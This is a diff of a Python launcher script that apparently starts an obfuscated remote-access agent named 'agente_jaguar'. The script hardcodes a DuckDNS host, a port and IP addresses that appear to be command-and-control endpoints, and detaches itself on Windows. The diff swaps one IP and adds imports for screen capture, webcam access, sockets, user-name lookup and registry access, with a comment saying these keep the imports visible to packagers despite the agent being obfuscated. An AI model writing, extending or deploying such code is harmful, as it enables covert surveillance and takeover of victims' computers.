@@ -2,7 +2,7 @@ import os, sys, subprocess
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 _HOST = 'jaguarxxx.duckdns.org'
 _PORT = '8000'
-_HOST2 = '46.246.12.18'
+_HOST2 = '46.246.14.3'
 os.environ.setdefault('JAGUAR_HOST', _HOST)
 os.environ.setdefault('JAGUAR_PORT', _PORT)
 os.environ.setdefault('JAGUAR_HOST2', _HOST2)
@@ -24,5 +24,15 @@ if sys.platform.startswith('win') and '--jaguar-detached' not in sys.argv:
         close_fds=True)
     sys.exit(0)
 sys.argv = [sys.argv[0], _HOST, _PORT, _HOST2]
+# --- warm-up de imports: visibles para PyInstaller/Nuitka aunque el agente esté ofuscado ---
+import io, time, base64, socket, getpass, platform, shutil
+try:
+    import winreg
+except Exception:
+    pass
+try:
+    import PIL, PIL.Image, PIL.ImageGrab, cv2
+except Exception:
+    pass
 import agente_jaguar as agente
 agente.main()
